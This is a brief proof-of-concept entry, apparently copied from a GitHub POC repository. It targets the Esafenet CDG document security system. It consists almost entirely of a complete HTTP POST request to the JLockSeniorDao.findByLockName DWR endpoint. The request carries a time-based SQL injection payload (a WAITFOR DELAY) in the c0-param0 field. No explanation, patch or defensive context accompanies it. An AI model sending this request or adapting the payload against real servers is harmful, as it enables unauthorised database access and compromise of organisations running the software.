# esafenet_JLockSeniorDao.findByLockName.dwr_sqli

from: https://github.com/wy876/POC/blob/main/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-jlockseniordao-findbylockname-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md

2024.5.6 @2 


```
POST /CDGServer3/dwr/call/plaincall/JLockSeniorDao.findByLockName.dwr HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Content-Length: 414
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Content-Type: text/plain
Accept-Encoding: gzip

callCount=1
page=/CDGServer3/dwr/test/JLockDao
httpSessionId=
scriptSessionId=
c0-scriptName=JLockSeniorDao
c0-methodName=findByLockName
c0-id=0
c0-param0=string:defaultKey1';WAITFOR DELAY '0:0:3'--
batchId=0
```
